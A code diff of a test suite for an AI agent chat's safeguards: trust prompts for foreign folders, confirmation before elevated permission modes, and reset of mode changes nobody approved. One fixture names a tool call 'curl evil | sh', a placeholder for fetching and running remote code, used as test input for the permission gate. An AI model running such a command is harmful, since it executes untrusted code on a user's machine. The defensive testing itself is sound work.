@@ -1,7 +1,7 @@
 // The Agents page's own chat (src/chatSessions.ts), built against a stub `vscode` and a stub adapter host (`./acp`): the trust gate,
 // the mode rules (foreign folders start in `default`, risky modes ask first), the folder rule for answering an edit for the user,
 // the plan dialog's mode change, cancelling, an adapter that exits mid-turn, and what the Harness hears.
-import { test, before, after, beforeEach } from 'node:test'
+import { test, before, after, afterEach } from 'node:test'
 import assert from 'node:assert/strict'
 import { build } from 'esbuild'
 import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs'
@@ -69,10 +69,20 @@ after(() => rmSync(tmp, { recursive: true, force: true }))
 
 let n = 0
 const transcript = (cwd, text) => JSON.stringify({ type: 'user', cwd, message: { role: 'user', content: text } }) + '\n'
+// A regression that leaves a promise pending (a modal nobody answers, a turn nobody ends) must fail the test in seconds, not hang the file.
+const T = { timeout: 5000 }
 const tick = () => new Promise(r => setTimeout(r, 5))
 const KIND = 'claude'
 const ALLOW = { optionId: 'a', name: 'Allow once', kind: 'allow_once' }
 const REJECT = { optionId: 'r', name: 'Reject', kind: 'reject_once' }
+
+// What a test left open is let go afterwards: questions cancelled, the held modal answered, the adapter's turns ended.
+const made = []
+afterEach(() => {
+	for (const cs of made.splice(0)) { cs.dispose() }
+	globalThis.__stub?.release?.()
+	for (const h of Object.values(globalThis.__stub?.hosts ?? {})) { h.turn?.res({ stopReason: 'cancelled' }) }
+})
 
 /** A machine with the window's own folder, a foreign one and a sub folder of the own one, each with one Claude session. */
 function setup(over = {}) {
@@ -99,6 +109,7 @@ function setup(over = {}) {
 	}
 	const context = { extensionPath: '/x', globalState: { get: (k, d) => store.has(k) ? store.get(k) : d, update: async (k, v) => { v === undefined ? store.delete(k) : store.set(k, v) } } }
 	const cs = new mod.ChatSessions(context, { sessions: new Map() }, { info() {}, debug() {}, warn() {} })
+	made.push(cs)
 	const events = []
 	cs.onEvent(e => events.push(e.event))
 	return { home, own, sub, foreign, ids, store, context, cs, events, S: globalThis.__stub }
@@ -115,7 +126,7 @@ const sinkOf = (m, chat) => m.S.hosts[KIND].sinks.get(chat.sessionId)
 const editAsk = (chat, path) => ({ sessionId: chat.sessionId, toolCall: { kind: 'edit', title: 'Edit', locations: path ? [{ path }] : [] }, options: [ALLOW, REJECT] })
 const modeOf = (events) => events.filter(e => e.t === 'config').at(-1)?.config.find(o => o.id === 'mode').value
 
-test('a folder outside the workspace is asked about once, by its real path, and the dialog says what else runs there', async () => {
+test('a folder outside the workspace is asked about once, by its real path, and the dialog says what else runs there', T, async () => {
 	const m = setup()
 	await openIn(m, 'foreign', false)
 	assert.equal(m.S.warnings.length, 1)
@@ -134,13 +145,13 @@ test('a folder outside the workspace is asked about once, by its real path, and 
 	assert.equal(m.S.warnings.length, 2)
 })
 
-test('declining the trust dialog starts nothing', async () => {
+test('declining the trust dialog starts nothing', T, async () => {
 	const m = setup({ warn: async () => undefined })
 	await assert.rejects(openIn(m, 'foreign', false), /Not started/)
 	assert.equal(m.S.hosts[KIND]?.calls.length ?? 0, 0)
 })
 
-test('the folder is checked again right before the agent starts: a link pointed elsewhere after the yes is refused', { skip: process.platform === 'win32' }, async () => {
+test('the folder is checked again right before the agent starts: a link pointed elsewhere after the yes is refused', { skip: process.platform === 'win32' }, T, async () => {
 	const m = setup()
 	const other = join(m.home, 'elsewhere')
 	mkdirSync(other)
@@ -158,7 +169,7 @@ test('the folder is checked again right before the agent starts: a link pointed 
 	assert.equal(m.S.hosts[KIND].calls.filter(c => c[0] === 'new' || c[0] === 'load').length, 0)
 })
 
-test('control characters in a folder name never reach a dialog', { skip: process.platform === 'win32' }, async () => {
+test('control characters in a folder name never reach a dialog', { skip: process.platform === 'win32' }, T, async () => {
 	const m = setup()
 	const odd = join(m.home, 'bad\nname\u001b[31m')
 	mkdirSync(odd)
@@ -170,7 +181,7 @@ test('control characters in a folder name never reach a dialog', { skip: process
 	assert.doesNotMatch(m.S.warnings[0].message, /[\u0000-\u001f]/)
 })
 
-test('a sub folder of the workspace is the window\'s own: no question, hooks on, the inherited mode kept', async () => {
+test('a sub folder of the workspace is the window\'s own: no question, hooks on, the inherited mode kept', T, async () => {
 	const m = setup({ initialMode: 'acceptEdits' })
 	const c = await openIn(m, 'sub')
 	assert.equal(m.S.warnings.length, 0)
@@ -183,7 +194,7 @@ test('a sub folder of the workspace is the window\'s own: no question, hooks on,
 	await p
 })
 
-test('outside the workspace a session always starts in default, whatever the folder\'s settings say', async () => {
+test('outside the workspace a session always starts in default, whatever the folder\'s settings say', T, async () => {
 	for (const initial of ['bypassPermissions', 'acceptEdits', 'auto']) {
 		const m = setup({ initialMode: initial })
 		const f = await openIn(m, 'foreign')
@@ -195,7 +206,7 @@ test('outside the workspace a session always starts in default, whatever the fol
 	}
 })
 
-test('risky modes need a modal yes, once per session and mode; a no changes nothing and puts the picker back', async () => {
+test('risky modes need a modal yes, once per session and mode; a no changes nothing and puts the picker back', T, async () => {
 	const m = setup()
 	const f = await openIn(m, 'foreign')
 	m.S.warnings.length = 0
@@ -228,7 +239,7 @@ test('risky modes need a modal yes, once per session and mode; a no changes noth
 	assert.equal(o.mode, 'bypassPermissions')
 })
 
-test('an answer for the user stays inside the session\'s folder: outside it, .. traversal, .git, .claude and no location are asked', async () => {
+test('an answer for the user stays inside the session\'s folder: outside it, .. traversal, .git, .claude and no location are asked', T, async () => {
 	const m = setup()
 	const o = await openIn(m, 'own')
 	await m.cs.setOption(o.id, 'mode', 'acceptEdits')
@@ -246,14 +257,15 @@ test('an answer for the user stays inside the session\'s folder: outside it, .. 
 	}
 })
 
-test('the plan dialog\'s mode change is followed: the picker moves, the adapter goes back to default, and the folder rule applies at once; no modal where none is needed', async () => {
+test('the plan dialog\'s mode change is followed: the picker moves, the adapter goes back to default, and the folder rule applies at once; no modal where none is needed', T, async () => {
 	const m = setup({ initialMode: 'plan' })
 	const f = await openIn(m, 'own')
 	assert.equal(f.mode, 'plan')
 	m.events.length = 0
 	m.S.warnings.length = 0
 	m.S.hosts[KIND].calls.length = 0
-	// The user approved "accept edits" in the plan question; the adapter reports its new mode.
+	// The user approved "accept edits" in the plan question (that answer left its grant); the adapter reports its new mode.
+	f.granted = 'acceptEdits'
 	sinkOf(m, f).onUpdate({ update: { sessionUpdate: 'config_option_update', configOptions: [{ id: 'mode', name: 'Mode', type: 'select', currentValue: 'acceptEdits', options: [{ value: 'acceptEdits' }, { value: 'default' }] }] } })
 	await tick()
 	assert.equal(f.mode, 'acceptEdits')
@@ -269,6 +281,20 @@ test('the plan dialog\'s mode change is followed: the picker moves, the adapter 
 	assert.equal(done.outcome.outcome, 'selected')
 })
 
+test('the adapter reports the plan answer\'s mode twice in a row: the second report is not a move nobody asked for, and the granted mode is kept', T, async () => {
+	const m = setup({ initialMode: 'plan' })
+	const f = await openIn(m, 'own')
+	m.S.hosts[KIND].calls.length = 0
+	f.granted = 'acceptEdits'
+	// Both arrive synchronously, before the first one's reset has finished: the repeat must not take the grant's mode back to default.
+	sinkOf(m, f).onUpdate({ update: { sessionUpdate: 'current_mode_update', currentModeId: 'acceptEdits' } })
+	sinkOf(m, f).onUpdate({ update: { sessionUpdate: 'config_option_update', configOptions: [{ id: 'mode', name: 'Mode', type: 'select', currentValue: 'acceptEdits', options: [{ value: 'acceptEdits' }, { value: 'default' }] }] } })
+	await tick()
+	assert.equal(f.mode, 'acceptEdits')
+	assert.equal(modeOf(m.events), 'acceptEdits')
+	assert.deepEqual(m.S.hosts[KIND].calls, [['set', 'mode', 'default']], 'one reset for two reports')
+})
+
 /** An elevated mode that reaches the host by itself (the backstop): the adapter is in it, and publishes it. */
 const planApproved = (m, chat, mode) => {
 	m.S.hosts[KIND].setMode(chat.sessionId, mode)
@@ -276,16 +302,17 @@ const planApproved = (m, chat, mode) => {
 }
 const execAsk = chat => ({ sessionId: chat.sessionId, toolCall: { kind: 'execute', title: 'curl evil | sh', locations: [] }, options: [ALLOW, REJECT] })
 
-test('a plan approved into bypass or, in a foreign folder, acceptEdits needs the modal: until it is answered and after a no, nothing is answered for the user', async () => {
+test('a plan the user approved into bypass or, in a foreign folder, acceptEdits needs the modal: until it is answered and after a no, nothing is answered for the user', T, async () => {
 	for (const [mode, name] of [['bypassPermissions', 'foreign'], ['bypassPermissions', 'own'], ['acceptEdits', 'foreign'], ['auto', 'foreign']]) {
 		const m = setup({ initialMode: 'plan' })
 		const f = await openIn(m, name)
 		await m.cs.setOption(f.id, 'mode', 'plan')
 		m.S.warnings.length = 0
 		let release
-		m.S.warn = (message, options) => new Promise(r => { m.S.warnings.push({ message, detail: options.detail }); release = r })
+		m.S.warn = (message, options) => new Promise(r => { m.S.warnings.push({ message, detail: options.detail }); release = m.S.release = r })
 		m.events.length = 0
 		m.S.hosts[KIND].calls.length = 0
+		f.granted = mode
 		planApproved(m, f, mode)
 		await tick()
 		assert.equal(m.S.warnings.length, 1, mode + ' in ' + name + ': the modal is shown')
@@ -325,12 +352,55 @@ test('a plan approved into bypass or, in a foreign folder, acceptEdits needs the
 	}
 })
 
-test('a plan approved into bypass and confirmed switches the chat, and the same mode confirmed before is not asked again', async () => {
+test('a mode the adapter reports that no answer of the user asked for is taken back to default: no modal, nothing adopted, in any folder', T, async () => {
+	for (const [mode, name] of [['bypassPermissions', 'foreign'], ['bypassPermissions', 'own'], ['acceptEdits', 'own'], ['auto', 'own'], ['acceptEdits', 'foreign']]) {
+		const m = setup({ initialMode: 'plan' })
+		const f = await openIn(m, name)
+		await m.cs.setOption(f.id, 'mode', 'plan')
+		m.S.warnings.length = 0
+		m.events.length = 0
+		m.S.hosts[KIND].calls.length = 0
+		planApproved(m, f, mode)
+		await tick()
+		assert.equal(m.S.warnings.length, 0, mode + ' in ' + name + ': no modal')
+		assert.deepEqual(m.S.hosts[KIND].calls, [['set', 'mode', 'default']], 'the adapter is reset')
+		assert.equal(m.S.hosts[KIND].modes.get(f.sessionId), 'default')
+		assert.equal(f.mode, 'default')
+		assert.equal(modeOf(m.events), 'default')
+		// A grant for another mode vouches for nothing, and is used up by the one report it met.
+		f.granted = 'auto'
+		planApproved(m, f, mode === 'auto' ? 'acceptEdits' : mode)
+		await tick()
+		assert.equal(f.mode, 'default', 'a grant for another mode vouches for nothing')
+		assert.equal(f.granted, undefined)
+	}
+})
+
+test('a grant is dropped by a new prompt and by cancelling: the adapter\'s later report is not the user\'s', T, async () => {
+	for (const how of ['prompt', 'cancel']) {
+		const m = setup({ initialMode: 'plan' })
+		const f = await openIn(m, 'own')
+		f.granted = 'acceptEdits'
+		if (how === 'prompt') {
+			void m.cs.prompt(f.id, 'go')
+			await tick()
+		} else {
+			await m.cs.cancel(f.id)
+		}
+		assert.equal(f.granted, undefined, how)
+		planApproved(m, f, 'acceptEdits')
+		await tick()
+		assert.notEqual(f.mode, 'acceptEdits', how)
+	}
+})
+
+test('a plan approved into bypass and confirmed switches the chat, and the same mode confirmed before is not asked again', T, async () => {
 	const m = setup({ initialMode: 'plan' })
 	const f = await openIn(m, 'foreign')
 	await m.cs.setOption(f.id, 'mode', 'plan')
 	m.S.warnings.length = 0
 	m.S.hosts[KIND].calls.length = 0
+	f.granted = 'bypassPermissions'
 	planApproved(m, f, 'bypassPermissions')
 	await tick()
 	assert.equal(m.S.warnings.length, 1)
@@ -341,6 +411,7 @@ test('a plan approved into bypass and confirmed switches the chat, and the same 
 	assert.deepEqual(done, { outcome: { outcome: 'selected', optionId: 'a' } })
 	// Back to plan and approved into bypass again: confirmed for this session already.
 	await m.cs.setOption(f.id, 'mode', 'plan')
+	f.granted = 'bypassPermissions'
 	planApproved(m, f, 'bypassPermissions')
 	await tick()
 	assert.equal(m.S.warnings.length, 1)
@@ -349,7 +420,8 @@ test('a plan approved into bypass and confirmed switches the chat, and the same 
 	const g = await openIn(m, 'own')
 	await m.cs.setOption(g.id, 'mode', 'plan')
 	let release
-	m.S.warn = (message, options) => new Promise(r => { m.S.warnings.push({ message, detail: options.detail }); release = r })
+	m.S.warn = (message, options) => new Promise(r => { m.S.warnings.push({ message, detail: options.detail }); release = m.S.release = r })
+	g.granted = 'bypassPermissions'
 	planApproved(m, g, 'bypassPermissions')
 	planApproved(m, g, 'bypassPermissions')
 	await tick()
@@ -359,7 +431,7 @@ test('a plan approved into bypass and confirmed switches the chat, and the same 
 	assert.equal(g.mode, 'bypassPermissions')
 })
 
-test('cancelling answers a pending question; an answer for a question that is not there is ignored', async () => {
+test('cancelling answers a pending question; an answer for a question that is not there is ignored', T, async () => {
 	const m = setup()
 	const c = await openIn(m, 'own')
 	const p = m.cs.prompt(c.id, 'go')
@@ -378,7 +450,7 @@ test('cancelling answers a pending question; an answer for a question that is no
 	assert.deepEqual(m.events.at(-1), { t: 'stop', reason: 'cancelled' })
 })
 
-test('an adapter that exits mid-turn marks the chat dead and says so once, in either order', async () => {
+test('an adapter that exits mid-turn marks the chat dead and says so once, in either order', T, async () => {
 	for (const exitFirst of [true, false]) {
 		const m = setup()
 		const c = await openIn(m, 'own')
@@ -409,7 +481,7 @@ test('an adapter that exits mid-turn marks the chat dead and says so once, in ei
 	}
 })
 
-test('a failed turn is a fatal error; "still answering" is only a line', async () => {
+test('a failed turn is a fatal error; "still answering" is only a line', T, async () => {
 	const m = setup()
 	const c = await openIn(m, 'own')
 	const p = m.cs.prompt(c.id, 'go')
@@ -422,7 +494,7 @@ test('a failed turn is a fatal error; "still answering" is only a line', async (
 	assert.deepEqual(m.events.at(-1), { t: 'error', fatal: true, text: 'model overloaded' })
 })
 
-test('a question of another folder never reaches the Harness inbox; this window\'s own does', async () => {
+test('a question of another folder never reaches the Harness inbox; this window\'s own does', T, async () => {
 	const m = setup()
 	const f = await openIn(m, 'foreign')
 	const o = await openIn(m, 'own')
@@ -437,7 +509,7 @@ test('a question of another folder never reaches the Harness inbox; this window\
 	assert.equal(recorded[0][1].decision, 'allowed')
 })
 
-test('a session that fails to start after it exists is let go: no sink left, the adapter told to close it', async () => {
+test('a session that fails to start after it exists is let go: no sink left, the adapter told to close it', T, async () => {
 	const m = setup({ failSet: true, initialMode: 'acceptEdits' })
 	await m.cs.projects()
 	const key = await keyOf(m.cs, m.foreign)
@@ -448,7 +520,7 @@ test('a session that fails to start after it exists is let go: no sink left, the
 	assert.equal(m.cs.get('claude:' + m.ids.foreign), undefined)
 })
 
-test('a prompt for a chat the host no longer has ends the page\'s turn with a fatal error for that chat', async () => {
+test('a prompt for a chat the host no longer has ends the page\'s turn with a fatal error for that chat', T, async () => {
 	const m = setup()
 	const seen = []
 	m.cs.onEvent(e => seen.push(e))
@@ -459,7 +531,7 @@ test('a prompt for a chat the host no longer has ends the page\'s turn with a fa
 	assert.equal(seen[0].event.fatal, true)
 })
 
-test('a chat the page is showing is never evicted, however many chats open after it', async () => {
+test('a chat the page is showing is never evicted, however many chats open after it', T, async () => {
 	const m = setup()
 	const shown = await openIn(m, 'own')
 	m.cs.opened(shown)
@@ -476,7 +548,7 @@ test('a chat the page is showing is never evicted, however many chats open after
 	await p
 })
 
-test('an adapter that exits while idle, after an earlier turn failed, still says the process ended', async () => {
+test('an adapter that exits while idle, after an earlier turn failed, still says the process ended', T, async () => {
 	const m = setup()
 	const c = await openIn(m, 'own')
 	const p = m.cs.prompt(c.id, 'go')
@@ -541,12 +613,12 @@ const planSetup = async (name, over) => {
 }
 const holdModal = m => {
 	const held = {}
-	m.S.warn = (message, options) => new Promise(r => { m.S.warnings.push({ message, detail: options.detail }); held.release = r })
+	m.S.warn = (message, options) => new Promise(r => { m.S.warnings.push({ message, detail: options.detail }); held.release = m.S.release = r })
 	return held
 }
 const askEvent = events => events.find(e => e.t === 'ask')
 
-test('an elevating plan answer is confirmed before the adapter hears it; a no sends the plain approval, nothing is ever elevated, the next command asks', async () => {
+test('an elevating plan answer is confirmed before the adapter hears it; a no sends the plain approval, nothing is ever elevated, the next command asks', T, async () => {
 	for (const [id, name] of [['exit-plan-bypass', 'foreign'], ['exit-plan-bypass', 'own'], ['exit-plan-auto', 'foreign'], ['exit-plan-accept-edits', 'foreign'], ['exit-plan-clear-bypass', 'own'], ['exit-plan-clear-auto', 'foreign']]) {
 		const { m, f } = await planSetup(name)
 		const held = holdModal(m)
@@ -582,7 +654,7 @@ test('an elevating plan answer is confirmed before the adapter hears it; a no se
 	}
 })
 
-test('without a plain approve option a no sends the plan\'s own "no", and the chat stays in plan', async () => {
+test('without a plain approve option a no sends the plan\'s own "no", and the chat stays in plan', T, async () => {
 	const { m, f } = await planSetup('foreign')
 	m.S.warn = async () => undefined
 	const options = PLAN_OPTIONS.filter(o => o.optionId !== 'exit-plan-default')
@@ -593,7 +665,7 @@ test('without a plain approve option a no sends the plan\'s own "no", and the ch
 	assert.equal(f.mode, 'plan')
 })
 
-test('an elevating plan answer that is confirmed is forwarded once and the chat takes the mode: no second modal, the adapter itself back in default', async () => {
+test('an elevating plan answer that is confirmed is forwarded once and the chat takes the mode: no second modal, the adapter itself back in default', T, async () => {
 	const { m, f } = await planSetup('foreign')
 	const q = planQuestion(m, f)
 	await tick()
@@ -610,7 +682,7 @@ test('an elevating plan answer that is confirmed is forwarded once and the chat 
 	assert.deepEqual(m.unasked, [], 'the question still passes through the host')
 })
 
-test('accept-edits as a plan answer asks in a foreign folder only', async () => {
+test('accept-edits as a plan answer asks in a foreign folder only', T, async () => {
 	for (const [name, modals] of [['foreign', 1], ['own', 0]]) {
 		const { m, f } = await planSetup(name)
 		const q = planQuestion(m, f)
@@ -624,7 +696,7 @@ test('accept-edits as a plan answer asks in a foreign folder only', async () => 
 	}
 })
 
-test('cancelling while the plan answer\'s modal is open answers the question as cancelled; a later yes applies nothing', async () => {
+test('cancelling while the plan answer\'s modal is open answers the question as cancelled; a later yes applies nothing', T, async () => {
 	const { m, f } = await planSetup('foreign')
 	const held = holdModal(m)
 	const q = sinkOf(m, f).onPermission({ sessionId: f.sessionId, toolCall: { kind: 'switch_mode', title: 'Ready to code?', locations: [] }, options: PLAN_OPTIONS })
@@ -639,7 +711,7 @@ test('cancelling while the plan answer\'s modal is open answers the question as 
 	assert.equal(f.mode, 'plan')
 })
 
-test('a plan answer confirmed after the chat moved elsewhere is dropped: the plain approval goes instead, never the elevated mode', async () => {
+test('a plan answer confirmed after the chat moved elsewhere is dropped: the plain approval goes instead, never the elevated mode', T, async () => {
 	const { m, f } = await planSetup('foreign')
 	const held = holdModal(m)
 	const q = planQuestion(m, f)
@@ -655,10 +727,11 @@ test('a plan answer confirmed after the chat moved elsewhere is dropped: the pla
 	assert.equal(f.mode, 'default')
 })
 
-test('backstop: an elevated mode that arrives unasked is taken back to default first; the modal then decides: no keeps default, yes applies the mode', async () => {
+test('backstop: an elevated mode that arrives unasked is taken back to default first; the modal then decides: no keeps default, yes applies the mode', T, async () => {
 	for (const yes of [false, true]) {
 		const { m, f } = await planSetup('foreign')
 		const held = holdModal(m)
+		f.granted = 'bypassPermissions'
 		planApproved(m, f, 'bypassPermissions')
 		await tick()
 		assert.deepEqual(m.S.hosts[KIND].calls, [['set', 'mode', 'default']], 'reset before the modal resolves')
@@ -673,9 +746,10 @@ test('backstop: an elevated mode that arrives unasked is taken back to default f
 	}
 })
 
-test('backstop: a modal answered after the chat moved elsewhere does not apply the older elevated mode', async () => {
+test('backstop: a modal answered after the chat moved elsewhere does not apply the older elevated mode', T, async () => {
 	const { m, f } = await planSetup('foreign')
 	const held = holdModal(m)
+	f.granted = 'bypassPermissions'
 	planApproved(m, f, 'bypassPermissions')
 	await tick()
 	await m.cs.setOption(f.id, 'mode', 'plan')
@@ -685,7 +759,7 @@ test('backstop: a modal answered after the chat moved elsewhere does not apply t
 	assert.equal(modeOf(m.events), 'plan')
 })
 
-test('backstop: when the reset itself fails the session is closed, the turn cancelled and one fatal error says why', async () => {
+test('backstop: when the reset itself fails the session is closed, the turn cancelled and one fatal error says why', T, async () => {
 	const { m, f } = await planSetup('foreign')
 	const p = m.cs.prompt(f.id, 'go')
 	await tick()
@@ -715,7 +789,7 @@ const EDIT_OPTIONS = [
 	{ optionId: 'reject', name: 'No', kind: 'reject_once' },
 ]
 const withUpdates = EDIT_OPTIONS.findIndex(o => o.optionId === 'allow-with-updates')
-/** A question of `kind` carrying those options; the stub adapter applies `allow-with-updates` as the real one does: acceptEdits, no update published. */
+/** A question of `kind` carrying those options; the stub adapter applies `allow-with-updates` as the real one does: acceptEdits, no update published, so one forwarded on an edit shows as an adapter that left default. */
 function updatesAsk(m, chat, kind, file) {
 	return sinkOf(m, chat).onPermission({ sessionId: chat.sessionId, toolCall: { kind, title: kind === 'edit' ? 'Edit' : 'npm test', locations: file ? [{ path: file }] : [] }, options: EDIT_OPTIONS }).then(res => {
 		m.answers.push(res.outcome.optionId)
@@ -726,7 +800,7 @@ function updatesAsk(m, chat, kind, file) {
 	})
 }
 
-test('"allow all edits during this session" on an edit asks in a foreign folder; a no sends the plain "yes" and the mode stays default', async () => {
+test('"allow all edits during this session" on an edit asks in a foreign folder; a no sends the plain "yes" and the mode stays default', T, async () => {
 	const m = setup()
 	m.answers = []
 	const f = await openIn(m, 'foreign')
@@ -748,7 +822,7 @@ test('"allow all edits during this session" on an edit asks in a foreign folder;
 	assert.equal(f.mode, 'default')
 })
 
-test('"allow all edits during this session" confirmed in a foreign folder, or in the own folder without a question: the chat takes acceptEdits, the picker follows, the adapter goes back to default', async () => {
+test('"allow all edits during this session" confirmed in a foreign folder, or in the own folder without a question: the adapter hears only the plain yes, the chat takes acceptEdits and the picker follows', T, async () => {
 	for (const [name, modals] of [['foreign', 1], ['own', 0]]) {
 		const m = setup()
 		m.answers = []
@@ -764,10 +838,12 @@ test('"allow all edits during this session" confirmed in a foreign folder, or in
 		await q
 		await tick()
 		assert.equal(m.S.warnings.length, modals, name)
-		assert.deepEqual(m.answers, ['allow-with-updates'], name)
+		assert.deepEqual(m.answers, ['allow-once'], name + ': allow-with-updates is never forwarded')
 		assert.equal(f.mode, 'acceptEdits', name)
 		assert.equal(modeOf(m.events), 'acceptEdits', name + ': the picker follows')
-		assert.equal(m.S.hosts[KIND].modes.get(f.sessionId), 'default', name + ': the adapter itself is back in default')
+		assert.deepEqual(m.S.hosts[KIND].history, [], name + ': the adapter never left default, and nothing reset it')
+		assert.equal(m.S.hosts[KIND].modes.get(f.sessionId), 'default', name)
+		assert.deepEqual(m.S.hosts[KIND].calls.filter(c => c[0] === 'set'), [], name + ': no mode was sent to the adapter')
 		m.events.length = 0
 		// Insilode's own rule now answers: inside the folder yes, outside it asks.
 		const inside = await sinkOf(m, f).onPermission(editAsk(f, join(m[name], 'b.txt')))
@@ -781,7 +857,17 @@ test('"allow all edits during this session" confirmed in a foreign folder, or in
 	}
 })
 
-test('"allow-with-updates" on a command question only adds rules: forwarded as it is, no modal, no mode change', async () => {
+test('picking Default always reaches the adapter, even when the cached mode already says default', T, async () => {
+	const m = setup()
+	const f = await openIn(m, 'foreign')
+	// The adapter was elevated without telling: the cache still shows default.
+	m.S.hosts[KIND].setMode(f.sessionId, 'acceptEdits')
+	await m.cs.setOption(f.id, 'mode', 'default')
+	assert.equal(m.S.hosts[KIND].modes.get(f.sessionId), 'default')
+	assert.ok(m.S.hosts[KIND].calls.some(c => c[0] === 'set' && c[1] === 'mode' && c[2] === 'default'))
+})
+
+test('"allow-with-updates" on a command question only adds rules: forwarded as it is, no modal, no mode change', T, async () => {
 	const m = setup()
 	m.answers = []
 	const f = await openIn(m, 'foreign')
